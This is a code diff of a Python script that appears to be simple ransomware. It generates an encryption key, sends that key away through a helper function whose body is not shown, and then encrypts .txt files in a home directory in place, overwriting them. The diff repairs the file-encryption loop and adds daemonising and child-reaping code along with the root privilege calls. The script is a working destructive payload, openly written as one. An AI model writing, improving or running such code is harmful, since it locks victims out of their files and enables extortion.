@@ -1,10 +1,20 @@
 #!/usr/bin/python3
 
-import json
 import requests
 import os
 import sys
+import signal
 from cryptography.fernet import Fernet
+
+
+def signalHandler(signalNumber, frame):
+    while True:
+        try:
+            pid, status = os.waitpid(-1, os.WNOHANG)
+        except OSError:
+            return
+        if pid == 0:
+            return
 
 
 def getStat():
@@ -22,24 +32,16 @@ def secureConnection():
     key = Fernet.generate_key()
     sendKey(key)
 
-    # print(os.path.expanduser('~'))
-    # for file in os.listdir(os.path.expanduser('~')):
-    #     if file.endswith(".txt"):
-    #         print(os.path.join(os.path.expanduser('~'), file))
-
-    for root, dirs, files in os.listdir("/home/test/"):
-        for file in files:
-            if file.endswith(".txt"):
-                filePath = os.path.join(root, file)
-                print(filePath)
-                f = Fernet(key)
-                with open(filePath, "rb") as fileContents:
-                    data = fileContents.read()
-                    encryptedData = f.encrypt(data)
-                with open(filePath, "wb") as fileContents:
-                    fileContents.write(encryptedData)
-
-
+    for file in os.listdir(os.path.expanduser('/home/test/')):
+        if file.endswith(".txt"):
+            filePath = os.path.join("/home/test/", file)
+            print(filePath)
+            f = Fernet(key)
+            with open(filePath, "rb") as fileContents:
+                data = fileContents.read()
+                encryptedData = f.encrypt(data)
+            with open(filePath, "wb") as fileContents:
+                fileContents.write(encryptedData)
 
 
 def sendKey(key):
@@ -60,6 +62,8 @@ if __name__ == '__main__':
     os.setsid()
     os.setuid(0)
     os.setgid(0)
+
+    signal.signal(signal.SIGCHLD, signalHandler)
 
     try:
         pid = os.fork()
